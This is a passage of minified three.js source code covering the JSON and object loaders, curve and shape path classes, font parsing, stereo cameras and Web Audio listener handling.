d.parse(k)}}()};zb.Handlers={handlers:[],add:function(a,b){this.handlers.push(a,b)},get:function(a){for(var b=this.handlers,c=0,d=b.length;c<d;c+=2){var e=b[c+1];if(b[c].test(a))return e}return null}};\nObject.assign(de.prototype,{load:function(a,b,c,d){var e=this,f=this.texturePath&&\"string\"===typeof this.texturePath?this.texturePath:zb.prototype.extractUrlBase(a),g=new sa(this.manager);g.setWithCredentials(this.withCredentials);g.load(a,function(c){c=JSON.parse(c);var d=c.metadata;if(void 0!==d&&(d=d.type,void 0!==d)){if(\"object\"===d.toLowerCase()){console.error(\"THREE.JSONLoader: \"+a+\" should be loaded with THREE.ObjectLoader instead.\");return}if(\"scene\"===d.toLowerCase()){console.error(\"THREE.JSONLoader: \"+\na+\" should be loaded with THREE.SceneLoader instead.\");return}}c=e.parse(c,f);b(c.geometry,c.materials)},c,d)},setTexturePath:function(a){this.texturePath=a},parse:function(a,b){var c=new T,d=void 0!==a.scale?1/a.scale:1;(function(b){var d,g,h,m,k,l,p,n,u,G,r,A,w,y=a.faces;l=a.vertices;var x=a.normals,v=a.colors,z=0;if(void 0!==a.uvs){for(d=0;d<a.uvs.length;d++)a.uvs[d].length&&z++;for(d=0;d<z;d++)c.faceVertexUvs[d]=[]}m=0;for(k=l.length;m<k;)d=new q,d.x=l[m++]*b,d.y=l[m++]*b,d.z=l[m++]*b,c.vertices.push(d);\nm=0;for(k=y.length;m<k;)if(b=y[m++],u=b&1,h=b&2,d=b&8,p=b&16,G=b&32,l=b&64,b&=128,u){u=new ha;u.a=y[m];u.b=y[m+1];u.c=y[m+3];r=new ha;r.a=y[m+1];r.b=y[m+2];r.c=y[m+3];m+=4;h&&(h=y[m++],u.materialIndex=h,r.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<z;d++)for(A=a.uvs[d],c.faceVertexUvs[d][h]=[],c.faceVertexUvs[d][h+1]=[],g=0;4>g;g++)n=y[m++],w=A[2*n],n=A[2*n+1],w=new D(w,n),2!==g&&c.faceVertexUvs[d][h].push(w),0!==g&&c.faceVertexUvs[d][h+1].push(w);p&&(p=3*y[m++],u.normal.set(x[p++],x[p++],x[p]),\nr.normal.copy(u.normal));if(G)for(d=0;4>d;d++)p=3*y[m++],G=new q(x[p++],x[p++],x[p]),2!==d&&u.vertexNormals.push(G),0!==d&&r.vertexNormals.push(G);l&&(l=y[m++],l=v[l],u.color.setHex(l),r.color.setHex(l));if(b)for(d=0;4>d;d++)l=y[m++],l=v[l],2!==d&&u.vertexColors.push(new J(l)),0!==d&&r.vertexColors.push(new J(l));c.faces.push(u);c.faces.push(r)}else{u=new ha;u.a=y[m++];u.b=y[m++];u.c=y[m++];h&&(h=y[m++],u.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<z;d++)for(A=a.uvs[d],c.faceVertexUvs[d][h]=\n[],g=0;3>g;g++)n=y[m++],w=A[2*n],n=A[2*n+1],w=new D(w,n),c.faceVertexUvs[d][h].push(w);p&&(p=3*y[m++],u.normal.set(x[p++],x[p++],x[p]));if(G)for(d=0;3>d;d++)p=3*y[m++],G=new q(x[p++],x[p++],x[p]),u.vertexNormals.push(G);l&&(l=y[m++],u.color.setHex(v[l]));if(b)for(d=0;3>d;d++)l=y[m++],u.vertexColors.push(new J(v[l]));c.faces.push(u)}})(d);(function(){var b=void 0!==a.influencesPerVertex?a.influencesPerVertex:2;if(a.skinWeights)for(var d=0,g=a.skinWeights.length;d<g;d+=b)c.skinWeights.push(new fa(a.skinWeights[d],\n1<b?a.skinWeights[d+1]:0,2<b?a.skinWeights[d+2]:0,3<b?a.skinWeights[d+3]:0));if(a.skinIndices)for(d=0,g=a.skinIndices.length;d<g;d+=b)c.skinIndices.push(new fa(a.skinIndices[d],1<b?a.skinIndices[d+1]:0,2<b?a.skinIndices[d+2]:0,3<b?a.skinIndices[d+3]:0));c.bones=a.bones;c.bones&&0<c.bones.length&&(c.skinWeights.length!==c.skinIndices.length||c.skinIndices.length!==c.vertices.length)&&console.warn(\"When skinning, number of vertices (\"+c.vertices.length+\"), skinIndices (\"+c.skinIndices.length+\"), and skinWeights (\"+\nc.skinWeights.length+\") should match.\")})();(function(b){if(void 0!==a.morphTargets)for(var d=0,g=a.morphTargets.length;d<g;d++){c.morphTargets[d]={};c.morphTargets[d].name=a.morphTargets[d].name;c.morphTargets[d].vertices=[];for(var h=c.morphTargets[d].vertices,m=a.morphTargets[d].vertices,k=0,l=m.length;k<l;k+=3){var p=new q;p.x=m[k]*b;p.y=m[k+1]*b;p.z=m[k+2]*b;h.push(p)}}if(void 0!==a.morphColors&&0<a.morphColors.length)for(console.warn('THREE.JSONLoader: \"morphColors\" no longer supported. Using them as face colors.'),\nb=c.faces,h=a.morphColors[0].colors,d=0,g=b.length;d<g;d++)b[d].color.fromArray(h,3*d)})(d);(function(){var b=[],d=[];void 0!==a.animation&&d.push(a.animation);void 0!==a.animations&&(a.animations.length?d=d.concat(a.animations):d.push(a.animations));for(var g=0;g<d.length;g++){var h=qa.parseAnimation(d[g],c.bones);h&&b.push(h)}c.morphTargets&&(d=qa.CreateClipsFromMorphTargetSequences(c.morphTargets,10),b=b.concat(d));0<b.length&&(c.animations=b)})();c.computeFaceNormals();c.computeBoundingSphere();\nif(void 0===a.materials||0===a.materials.length)return{geometry:c};d=zb.prototype.initMaterials(a.materials,b,this.crossOrigin);return{geometry:c,materials:d}}});Object.assign(Se.prototype,{load:function(a,b,c,d){\"\"===this.texturePath&&(this.texturePath=a.substring(0,a.lastIndexOf(\"/\")+1));var e=this;(new sa(e.manager)).load(a,function(c){var g=null;try{g=JSON.parse(c)}catch(h){void 0!==d&&d(h);console.error(\"THREE:ObjectLoader: Can't parse \"+a+\".\",h.message);return}c=g.metadata;void 0===c||void 0===\nc.type||\"geometry\"===c.type.toLowerCase()?console.error(\"THREE.ObjectLoader: Can't load \"+a+\". Use THREE.JSONLoader instead.\"):e.parse(g,b)},c,d)},setTexturePath:function(a){this.texturePath=a},setCrossOrigin:function(a){this.crossOrigin=a},parse:function(a,b){var c=this.parseGeometries(a.geometries),d=this.parseImages(a.images,function(){void 0!==b&&b(e)}),d=this.parseTextures(a.textures,d),d=this.parseMaterials(a.materials,d),e=this.parseObject(a.object,c,d);a.animations&&(e.animations=this.parseAnimations(a.animations));\nvoid 0!==a.images&&0!==a.images.length||void 0===b||b(e);return e},parseGeometries:function(a){var b={};if(void 0!==a)for(var c=new de,d=new ce,e=0,f=a.length;e<f;e++){var g,h=a[e];switch(h.type){case \"PlaneGeometry\":case \"PlaneBufferGeometry\":g=new Ma[h.type](h.width,h.height,h.widthSegments,h.heightSegments);break;case \"BoxGeometry\":case \"BoxBufferGeometry\":case \"CubeGeometry\":g=new Ma[h.type](h.width,h.height,h.depth,h.widthSegments,h.heightSegments,h.depthSegments);break;case \"CircleGeometry\":case \"CircleBufferGeometry\":g=\nnew Ma[h.type](h.radius,h.segments,h.thetaStart,h.thetaLength);break;case \"CylinderGeometry\":case \"CylinderBufferGeometry\":g=new Ma[h.type](h.radiusTop,h.radiusBottom,h.height,h.radialSegments,h.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"ConeGeometry\":case \"ConeBufferGeometry\":g=new Ma[h.type](h.radius,h.height,h.radialSegments,h.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"SphereGeometry\":case \"SphereBufferGeometry\":g=new Ma[h.type](h.radius,h.widthSegments,\nh.heightSegments,h.phiStart,h.phiLength,h.thetaStart,h.thetaLength);break;case \"DodecahedronGeometry\":case \"IcosahedronGeometry\":case \"OctahedronGeometry\":case \"TetrahedronGeometry\":g=new Ma[h.type](h.radius,h.detail);break;case \"RingGeometry\":case \"RingBufferGeometry\":g=new Ma[h.type](h.innerRadius,h.outerRadius,h.thetaSegments,h.phiSegments,h.thetaStart,h.thetaLength);break;case \"TorusGeometry\":case \"TorusBufferGeometry\":g=new Ma[h.type](h.radius,h.tube,h.radialSegments,h.tubularSegments,h.arc);\nbreak;case \"TorusKnotGeometry\":case \"TorusKnotBufferGeometry\":g=new Ma[h.type](h.radius,h.tube,h.tubularSegments,h.radialSegments,h.p,h.q);break;case \"LatheGeometry\":case \"LatheBufferGeometry\":g=new Ma[h.type](h.points,h.segments,h.phiStart,h.phiLength);break;case \"BufferGeometry\":g=d.parse(h);break;case \"Geometry\":g=c.parse(h.data,this.texturePath).geometry;break;default:console.warn('THREE.ObjectLoader: Unsupported geometry type \"'+h.type+'\"');continue}g.uuid=h.uuid;void 0!==h.name&&(g.name=h.name);\nb[h.uuid]=g}return b},parseMaterials:function(a,b){var c={};if(void 0!==a){var d=new Hd;d.setTextures(b);for(var e=0,f=a.length;e<f;e++){var g=d.parse(a[e]);c[g.uuid]=g}}return c},parseAnimations:function(a){for(var b=[],c=0;c<a.length;c++){var d=qa.parse(a[c]);b.push(d)}return b},parseImages:function(a,b){function c(a){d.manager.itemStart(a);return g.load(a,function(){d.manager.itemEnd(a)},void 0,function(){d.manager.itemError(a)})}var d=this,e={};if(void 0!==a&&0<a.length){var f=new $d(b),g=new Yc(f);\ng.setCrossOrigin(this.crossOrigin);for(var f=0,h=a.length;f<h;f++){var m=a[f],k=/^(\\/\\/)|([a-z]+:(\\/\\/)?)/i.test(m.url)?m.url:d.texturePath+m.url;e[m.uuid]=c(k)}}return e},parseTextures:function(a,b){function c(a,b){if(\"number\"===typeof a)return a;console.warn(\"THREE.ObjectLoader.parseTexture: Constant should be in numeric form.\",a);return b[a]}var d={UVMapping:300,CubeReflectionMapping:301,CubeRefractionMapping:302,EquirectangularReflectionMapping:303,EquirectangularRefractionMapping:304,SphericalReflectionMapping:305,\nCubeUVReflectionMapping:306,CubeUVRefractionMapping:307},e={RepeatWrapping:1E3,ClampToEdgeWrapping:1001,MirroredRepeatWrapping:1002},f={NearestFilter:1003,NearestMipMapNearestFilter:1004,NearestMipMapLinearFilter:1005,LinearFilter:1006,LinearMipMapNearestFilter:1007,LinearMipMapLinearFilter:1008},g={};if(void 0!==a)for(var h=0,m=a.length;h<m;h++){var k=a[h];void 0===k.image&&console.warn('THREE.ObjectLoader: No \"image\" specified for',k.uuid);void 0===b[k.image]&&console.warn(\"THREE.ObjectLoader: Undefined image\",\nk.image);var l=new ea(b[k.image]);l.needsUpdate=!0;l.uuid=k.uuid;void 0!==k.name&&(l.name=k.name);void 0!==k.mapping&&(l.mapping=c(k.mapping,d));void 0!==k.offset&&l.offset.fromArray(k.offset);void 0!==k.repeat&&l.repeat.fromArray(k.repeat);void 0!==k.wrap&&(l.wrapS=c(k.wrap[0],e),l.wrapT=c(k.wrap[1],e));void 0!==k.minFilter&&(l.minFilter=c(k.minFilter,f));void 0!==k.magFilter&&(l.magFilter=c(k.magFilter,f));void 0!==k.anisotropy&&(l.anisotropy=k.anisotropy);void 0!==k.flipY&&(l.flipY=k.flipY);g[k.uuid]=\nl}return g},parseObject:function(){var a=new S;return function(b,c,d){function e(a){void 0===c[a]&&console.warn(\"THREE.ObjectLoader: Undefined geometry\",a);return c[a]}function f(a){if(void 0!==a)return void 0===d[a]&&console.warn(\"THREE.ObjectLoader: Undefined material\",a),d[a]}var g;switch(b.type){case \"Scene\":g=new mb;void 0!==b.background&&Number.isInteger(b.background)&&(g.background=new J(b.background));void 0!==b.fog&&(\"Fog\"===b.fog.type?g.fog=new Lb(b.fog.color,b.fog.near,b.fog.far):\"FogExp2\"===\nb.fog.type&&(g.fog=new Kb(b.fog.color,b.fog.density)));break;case \"PerspectiveCamera\":g=new Fa(b.fov,b.aspect,b.near,b.far);void 0!==b.focus&&(g.focus=b.focus);void 0!==b.zoom&&(g.zoom=b.zoom);void 0!==b.filmGauge&&(g.filmGauge=b.filmGauge);void 0!==b.filmOffset&&(g.filmOffset=b.filmOffset);void 0!==b.view&&(g.view=Object.assign({},b.view));break;case \"OrthographicCamera\":g=new Jb(b.left,b.right,b.top,b.bottom,b.near,b.far);break;case \"AmbientLight\":g=new Ad(b.color,b.intensity);break;case \"DirectionalLight\":g=\nnew zd(b.color,b.intensity);break;case \"PointLight\":g=new xd(b.color,b.intensity,b.distance,b.decay);break;case \"SpotLight\":g=new wd(b.color,b.intensity,b.distance,b.angle,b.penumbra,b.decay);break;case \"HemisphereLight\":g=new ud(b.color,b.groundColor,b.intensity);break;case \"Mesh\":g=e(b.geometry);var h=f(b.material);g=g.bones&&0<g.bones.length?new qd(g,h):new Aa(g,h);break;case \"LOD\":g=new Ec;break;case \"Line\":g=new Ua(e(b.geometry),f(b.material),b.mode);break;case \"LineSegments\":g=new ga(e(b.geometry),\nf(b.material));break;case \"PointCloud\":case \"Points\":g=new Mb(e(b.geometry),f(b.material));break;case \"Sprite\":g=new Dc(f(b.material));break;case \"Group\":g=new Fc;break;case \"SkinnedMesh\":console.warn(\"THREE.ObjectLoader.parseObject() does not support SkinnedMesh type. Instantiates Object3D instead.\");default:g=new x}g.uuid=b.uuid;void 0!==b.name&&(g.name=b.name);void 0!==b.matrix?(a.fromArray(b.matrix),a.decompose(g.position,g.quaternion,g.scale)):(void 0!==b.position&&g.position.fromArray(b.position),\nvoid 0!==b.rotation&&g.rotation.fromArray(b.rotation),void 0!==b.quaternion&&g.quaternion.fromArray(b.quaternion),void 0!==b.scale&&g.scale.fromArray(b.scale));void 0!==b.castShadow&&(g.castShadow=b.castShadow);void 0!==b.receiveShadow&&(g.receiveShadow=b.receiveShadow);b.shadow&&(void 0!==b.shadow.bias&&(g.shadow.bias=b.shadow.bias),void 0!==b.shadow.radius&&(g.shadow.radius=b.shadow.radius),void 0!==b.shadow.mapSize&&g.shadow.mapSize.fromArray(b.shadow.mapSize),void 0!==b.shadow.camera&&(g.shadow.camera=\nthis.parseObject(b.shadow.camera)));void 0!==b.visible&&(g.visible=b.visible);void 0!==b.userData&&(g.userData=b.userData);if(void 0!==b.children)for(var m in b.children)g.add(this.parseObject(b.children[m],c,d));if(\"LOD\"===b.type)for(b=b.levels,h=0;h<b.length;h++){var k=b[h];m=g.getObjectByProperty(\"uuid\",k.object);void 0!==m&&g.addLevel(m,k.distance)}return g}}()});ua.prototype={constructor:ua,getPoint:function(a){console.warn(\"THREE.Curve: Warning, getPoint() not implemented!\");return null},getPointAt:function(a){a=\nthis.getUtoTmapping(a);return this.getPoint(a)},getPoints:function(a){isNaN(a)&&(a=5);for(var b=[],c=0;c<=a;c++)b.push(this.getPoint(c/a));return b},getSpacedPoints:function(a){isNaN(a)&&(a=5);for(var b=[],c=0;c<=a;c++)b.push(this.getPointAt(c/a));return b},getLength:function(){var a=this.getLengths();return a[a.length-1]},getLengths:function(a){isNaN(a)&&(a=this.__arcLengthDivisions?this.__arcLengthDivisions:200);if(this.cacheArcLengths&&this.cacheArcLengths.length===a+1&&!this.needsUpdate)return this.cacheArcLengths;\nthis.needsUpdate=!1;var b=[],c,d=this.getPoint(0),e,f=0;b.push(0);for(e=1;e<=a;e++)c=this.getPoint(e/a),f+=c.distanceTo(d),b.push(f),d=c;return this.cacheArcLengths=b},updateArcLengths:function(){this.needsUpdate=!0;this.getLengths()},getUtoTmapping:function(a,b){var c=this.getLengths(),d,e=c.length,f;f=b?b:a*c[e-1];for(var g=0,h=e-1,m;g<=h;)if(d=Math.floor(g+(h-g)/2),m=c[d]-f,0>m)g=d+1;else if(0<m)h=d-1;else{h=d;break}d=h;if(c[d]===f)return d/(e-1);g=c[d];return(d+(f-g)/(c[d+1]-g))/(e-1)},getTangent:function(a){var b=\na-1E-4;a+=1E-4;0>b&&(b=0);1<a&&(a=1);b=this.getPoint(b);return this.getPoint(a).clone().sub(b).normalize()},getTangentAt:function(a){a=this.getUtoTmapping(a);return this.getTangent(a)},computeFrenetFrames:function(a,b){var c=new q,d=[],e=[],f=[],g=new q,h=new S,m,k;for(m=0;m<=a;m++)k=m/a,d[m]=this.getTangentAt(k),d[m].normalize();e[0]=new q;f[0]=new q;m=Number.MAX_VALUE;k=Math.abs(d[0].x);var l=Math.abs(d[0].y),p=Math.abs(d[0].z);k<=m&&(m=k,c.set(1,0,0));l<=m&&(m=l,c.set(0,1,0));p<=m&&c.set(0,0,1);\ng.crossVectors(d[0],c).normalize();e[0].crossVectors(d[0],g);f[0].crossVectors(d[0],e[0]);for(m=1;m<=a;m++)e[m]=e[m-1].clone(),f[m]=f[m-1].clone(),g.crossVectors(d[m-1],d[m]),g.length()>Number.EPSILON&&(g.normalize(),c=Math.acos(N.clamp(d[m-1].dot(d[m]),-1,1)),e[m].applyMatrix4(h.makeRotationAxis(g,c))),f[m].crossVectors(d[m],e[m]);if(!0===b)for(c=Math.acos(N.clamp(e[0].dot(e[a]),-1,1)),c/=a,0<d[0].dot(g.crossVectors(e[0],e[a]))&&(c=-c),m=1;m<=a;m++)e[m].applyMatrix4(h.makeRotationAxis(d[m],c*m)),\nf[m].crossVectors(d[m],e[m]);return{tangents:d,normals:e,binormals:f}}};Ta.prototype=Object.create(ua.prototype);Ta.prototype.constructor=Ta;Ta.prototype.isLineCurve=!0;Ta.prototype.getPoint=function(a){if(1===a)return this.v2.clone();var b=this.v2.clone().sub(this.v1);b.multiplyScalar(a).add(this.v1);return b};Ta.prototype.getPointAt=function(a){return this.getPoint(a)};Ta.prototype.getTangent=function(a){return this.v2.clone().sub(this.v1).normalize()};ad.prototype=Object.assign(Object.create(ua.prototype),\n{constructor:ad,add:function(a){this.curves.push(a)},closePath:function(){var a=this.curves[0].getPoint(0),b=this.curves[this.curves.length-1].getPoint(1);a.equals(b)||this.curves.push(new Ta(b,a))},getPoint:function(a){var b=a*this.getLength(),c=this.getCurveLengths();for(a=0;a<c.length;){if(c[a]>=b)return b=c[a]-b,a=this.curves[a],c=a.getLength(),a.getPointAt(0===c?0:1-b/c);a++}return null},getLength:function(){var a=this.getCurveLengths();return a[a.length-1]},updateArcLengths:function(){this.needsUpdate=\n!0;this.cacheLengths=null;this.getLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var a=[],b=0,c=0,d=this.curves.length;c<d;c++)b+=this.curves[c].getLength(),a.push(b);return this.cacheLengths=a},getSpacedPoints:function(a){isNaN(a)&&(a=40);for(var b=[],c=0;c<=a;c++)b.push(this.getPoint(c/a));this.autoClose&&b.push(b[0]);return b},getPoints:function(a){a=a||12;for(var b=[],c,d=0,e=this.curves;d<e.length;d++)for(var f=\ne[d],f=f.getPoints(f&&f.isEllipseCurve?2*a:f&&f.isLineCurve?1:f&&f.isSplineCurve?a*f.points.length:a),g=0;g<f.length;g++){var h=f[g];c&&c.equals(h)||(b.push(h),c=h)}this.autoClose&&1<b.length&&!b[b.length-1].equals(b[0])&&b.push(b[0]);return b},createPointsGeometry:function(a){a=this.getPoints(a);return this.createGeometry(a)},createSpacedPointsGeometry:function(a){a=this.getSpacedPoints(a);return this.createGeometry(a)},createGeometry:function(a){for(var b=new T,c=0,d=a.length;c<d;c++){var e=a[c];\nb.vertices.push(new q(e.x,e.y,e.z||0))}return b}});Wa.prototype=Object.create(ua.prototype);Wa.prototype.constructor=Wa;Wa.prototype.isEllipseCurve=!0;Wa.prototype.getPoint=function(a){for(var b=2*Math.PI,c=this.aEndAngle-this.aStartAngle,d=Math.abs(c)<Number.EPSILON;0>c;)c+=b;for(;c>b;)c-=b;c<Number.EPSILON&&(c=d?0:b);!0!==this.aClockwise||d||(c=c===b?-b:c-b);b=this.aStartAngle+a*c;a=this.aX+this.xRadius*Math.cos(b);var e=this.aY+this.yRadius*Math.sin(b);0!==this.aRotation&&(b=Math.cos(this.aRotation),\nc=Math.sin(this.aRotation),d=a-this.aX,e-=this.aY,a=d*b-e*c+this.aX,e=d*c+e*b+this.aY);return new D(a,e)};Cb.prototype=Object.create(ua.prototype);Cb.prototype.constructor=Cb;Cb.prototype.isSplineCurve=!0;Cb.prototype.getPoint=function(a){var b=this.points,c=(b.length-1)*a;a=Math.floor(c);var c=c-a,d=b[0===a?a:a-1],e=b[a],f=b[a>b.length-2?b.length-1:a+1],b=b[a>b.length-3?b.length-1:a+2];return new D(Te(c,d.x,e.x,f.x,b.x),Te(c,d.y,e.y,f.y,b.y))};fc.prototype=Object.create(ua.prototype);fc.prototype.constructor=\nfc;fc.prototype.getPoint=function(a){var b=this.v0,c=this.v1,d=this.v2,e=this.v3;return new D(Bb(a,b.x,c.x,d.x,e.x),Bb(a,b.y,c.y,d.y,e.y))};gc.prototype=Object.create(ua.prototype);gc.prototype.constructor=gc;gc.prototype.getPoint=function(a){var b=this.v0,c=this.v1,d=this.v2;return new D(Ab(a,b.x,c.x,d.x),Ab(a,b.y,c.y,d.y))};var xe=Object.assign(Object.create(ad.prototype),{fromPoints:function(a){this.moveTo(a[0].x,a[0].y);for(var b=1,c=a.length;b<c;b++)this.lineTo(a[b].x,a[b].y)},moveTo:function(a,\nb){this.currentPoint.set(a,b)},lineTo:function(a,b){var c=new Ta(this.currentPoint.clone(),new D(a,b));this.curves.push(c);this.currentPoint.set(a,b)},quadraticCurveTo:function(a,b,c,d){a=new gc(this.currentPoint.clone(),new D(a,b),new D(c,d));this.curves.push(a);this.currentPoint.set(c,d)},bezierCurveTo:function(a,b,c,d,e,f){a=new fc(this.currentPoint.clone(),new D(a,b),new D(c,d),new D(e,f));this.curves.push(a);this.currentPoint.set(e,f)},splineThru:function(a){var b=[this.currentPoint.clone()].concat(a),\nb=new Cb(b);this.curves.push(b);this.currentPoint.copy(a[a.length-1])},arc:function(a,b,c,d,e,f){this.absarc(a+this.currentPoint.x,b+this.currentPoint.y,c,d,e,f)},absarc:function(a,b,c,d,e,f){this.absellipse(a,b,c,c,d,e,f)},ellipse:function(a,b,c,d,e,f,g,h){this.absellipse(a+this.currentPoint.x,b+this.currentPoint.y,c,d,e,f,g,h)},absellipse:function(a,b,c,d,e,f,g,h){a=new Wa(a,b,c,d,e,f,g,h);0<this.curves.length&&(b=a.getPoint(0),b.equals(this.currentPoint)||this.lineTo(b.x,b.y));this.curves.push(a);\na=a.getPoint(1);this.currentPoint.copy(a)}});bd.prototype=xe;xe.constructor=bd;Db.prototype=Object.assign(Object.create(xe),{constructor:Db,getPointsHoles:function(a){for(var b=[],c=0,d=this.holes.length;c<d;c++)b[c]=this.holes[c].getPoints(a);return b},extractAllPoints:function(a){return{shape:this.getPoints(a),holes:this.getPointsHoles(a)}},extractPoints:function(a){return this.extractAllPoints(a)}});ee.prototype={moveTo:function(a,b){this.currentPath=new bd;this.subPaths.push(this.currentPath);\nthis.currentPath.moveTo(a,b)},lineTo:function(a,b){this.currentPath.lineTo(a,b)},quadraticCurveTo:function(a,b,c,d){this.currentPath.quadraticCurveTo(a,b,c,d)},bezierCurveTo:function(a,b,c,d,e,f){this.currentPath.bezierCurveTo(a,b,c,d,e,f)},splineThru:function(a){this.currentPath.splineThru(a)},toShapes:function(a,b){function c(a){for(var b=[],c=0,d=a.length;c<d;c++){var e=a[c],f=new Db;f.curves=e.curves;b.push(f)}return b}function d(a,b){for(var c=b.length,d=!1,e=c-1,f=0;f<c;e=f++){var g=b[e],h=\nb[f],k=h.x-g.x,m=h.y-g.y;if(Math.abs(m)>Number.EPSILON){if(0>m&&(g=b[f],k=-k,h=b[e],m=-m),!(a.y<g.y||a.y>h.y))if(a.y===g.y){if(a.x===g.x)return!0}else{e=m*(a.x-g.x)-k*(a.y-g.y);if(0===e)return!0;0>e||(d=!d)}}else if(a.y===g.y&&(h.x<=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return d}var e=Ia.isClockWise,f=this.subPaths;if(0===f.length)return[];if(!0===b)return c(f);var g,h,m,k=[];if(1===f.length)return h=f[0],m=new Db,m.curves=h.curves,k.push(m),k;var l=!e(f[0].getPoints()),l=a?!l:l;m=[];var p=\n[],n=[],q=0,x;p[q]=void 0;n[q]=[];for(var r=0,A=f.length;r<A;r++)h=f[r],x=h.getPoints(),g=e(x),(g=a?!g:g)?(!l&&p[q]&&q++,p[q]={s:new Db,p:x},p[q].s.curves=h.curves,l&&q++,n[q]=[]):n[q].push({h:h,p:x[0]});if(!p[0])return c(f);if(1<p.length){r=!1;h=[];e=0;for(f=p.length;e<f;e++)m[e]=[];e=0;for(f=p.length;e<f;e++)for(g=n[e],l=0;l<g.length;l++){q=g[l];x=!0;for(A=0;A<p.length;A++)d(q.p,p[A].p)&&(e!==A&&h.push({froms:e,tos:A,hole:l}),x?(x=!1,m[A].push(q)):r=!0);x&&m[e].push(q)}0<h.length&&(r||(n=m))}r=\n0;for(e=p.length;r<e;r++)for(m=p[r].s,k.push(m),h=n[r],f=0,g=h.length;f<g;f++)m.holes.push(h[f].h);return k}};Object.assign(fe.prototype,{isFont:!0,generateShapes:function(a,b,c){void 0===b&&(b=100);void 0===c&&(c=4);var d=this.data;a=String(a).split(\"\");var e=b/d.resolution,f=(d.boundingBox.yMax-d.boundingBox.yMin+d.underlineThickness)*e,g=0,h=0;b=[];for(var m=0;m<a.length;m++){var k=a[m];if(\"\\n\"===k)g=0,h-=f;else{var l;l=e;var p=g,n=h;if(k=d.glyphs[k]||d.glyphs[\"?\"]){var q=new ee,x=[],r,A,w,y,z,\nv,D,I;if(k.o)for(var C=k._cachedOutline||(k._cachedOutline=k.o.split(\" \")),F=0,J=C.length;F<J;)switch(C[F++]){case \"m\":r=C[F++]*l+p;A=C[F++]*l+n;q.moveTo(r,A);break;case \"l\":r=C[F++]*l+p;A=C[F++]*l+n;q.lineTo(r,A);break;case \"q\":r=C[F++]*l+p;A=C[F++]*l+n;z=C[F++]*l+p;v=C[F++]*l+n;q.quadraticCurveTo(z,v,r,A);if(y=x[x.length-1]){w=y.x;y=y.y;for(var H=1;H<=c;H++){var N=H/c;Ab(N,w,z,r);Ab(N,y,v,A)}}break;case \"b\":if(r=C[F++]*l+p,A=C[F++]*l+n,z=C[F++]*l+p,v=C[F++]*l+n,D=C[F++]*l+p,I=C[F++]*l+n,q.bezierCurveTo(z,\nv,D,I,r,A),y=x[x.length-1])for(w=y.x,y=y.y,H=1;H<=c;H++)N=H/c,Bb(N,w,z,D,r),Bb(N,y,v,I,A)}l={offsetX:k.ha*l,path:q}}else l=void 0;g+=l.offsetX;b.push(l.path)}}c=[];d=0;for(a=b.length;d<a;d++)Array.prototype.push.apply(c,b[d].toShapes());return c}});Object.assign(Ue.prototype,{load:function(a,b,c,d){var e=this;(new sa(this.manager)).load(a,function(a){var c;try{c=JSON.parse(a)}catch(d){console.warn(\"THREE.FontLoader: typeface.js support is being deprecated. Use typeface.json instead.\"),c=JSON.parse(a.substring(65,\na.length-2))}a=e.parse(c);b&&b(a)},c,d)},parse:function(a){return new fe(a)}});var Pd,je={getContext:function(){void 0===Pd&&(Pd=new (window.AudioContext||window.webkitAudioContext));return Pd},setContext:function(a){Pd=a}};Object.assign(ge.prototype,{load:function(a,b,c,d){var e=new sa(this.manager);e.setResponseType(\"arraybuffer\");e.load(a,function(a){je.getContext().decodeAudioData(a,function(a){b(a)})},c,d)}});he.prototype=Object.assign(Object.create(ma.prototype),{constructor:he,isRectAreaLight:!0,\ncopy:function(a){ma.prototype.copy.call(this,a);this.width=a.width;this.height=a.height;return this}});Object.assign(Ve.prototype,{update:function(){var a,b,c,d,e,f,g,h=new S,m=new S;return function(k){if(a!==this||b!==k.focus||c!==k.fov||d!==k.aspect*this.aspect||e!==k.near||f!==k.far||g!==k.zoom){a=this;b=k.focus;c=k.fov;d=k.aspect*this.aspect;e=k.near;f=k.far;g=k.zoom;var l=k.projectionMatrix.clone(),p=this.eyeSep/2,n=p*e/b,q=e*Math.tan(N.DEG2RAD*c*.5)/g,x;m.elements[12]=-p;h.elements[12]=p;p=\n-q*d+n;x=q*d+n;l.elements[0]=2*e/(x-p);l.elements[8]=(x+p)/(x-p);this.cameraL.projectionMatrix.copy(l);p=-q*d-n;x=q*d-n;l.elements[0]=2*e/(x-p);l.elements[8]=(x+p)/(x-p);this.cameraR.projectionMatrix.copy(l)}this.cameraL.matrixWorld.copy(k.matrixWorld).multiply(m);this.cameraR.matrixWorld.copy(k.matrixWorld).multiply(h)}}()});Id.prototype=Object.create(x.prototype);Id.prototype.constructor=Id;ie.prototype=Object.assign(Object.create(x.prototype),{constructor:ie,getInput:function(){return this.gain},\nremoveFilter:function(){null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null)},getFilter:function(){return this.filter},setFilter:function(a){null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):this.gain.disconnect(this.context.destination);this.filter=a;this.gain.connect(this.filter);this.filter.connect(this.context.destination)},getMasterVolume:function(){return this.gain.gain.value},\nsetMasterVolume:function(a){this.gain.gain.value=a},updateMatrixWorld:function(){var a=new q,b=new ca,c=new q,d=new q;return function(e){x.prototype.updateMatrixWorld.call(this,e);e=this.context.listener;var f=this.up;this.matrixWorld.decompose(a,b,c);d.set(0,0,-1).applyQuaternion(b);e.positionX?(e.positionX.setValueAtTime(a.x,this.context.currentTime),e.positionY.setValueAtTime(a.y,this.context.currentTime),e.positionZ.setValueAtTime(a.z,this.context.currentTime),e.forwardX.setValueAtTime(d.x,this.context.currentTime),\ne.forwardY.setValueAtTime(d.y,this.context.currentTime),e.forwardZ.setValueAtTime(d.z,this.context.currentTime),e.upX.setValueAtTime(f.x,this.context.currentTime),e.upY.setValueAtTime(f.y,this.context.currentTime),e.upZ.setValueAtTime(f.z,this.context.currentTime)):(e.setPosition(a.x,a.y,a.z),e.setOrientation(d.x,d.y,d.z,f.x,f.y,f.z))}}()});hc.prototype=Object.assign(Object.create(x.prototype),{constructor:hc,getOutput:function(){return this.gain},setNodeSource:function(a){this.hasPlaybackControl=\n!1;this.sourceType=\"audioNode\";this.source=a;this.connect();return 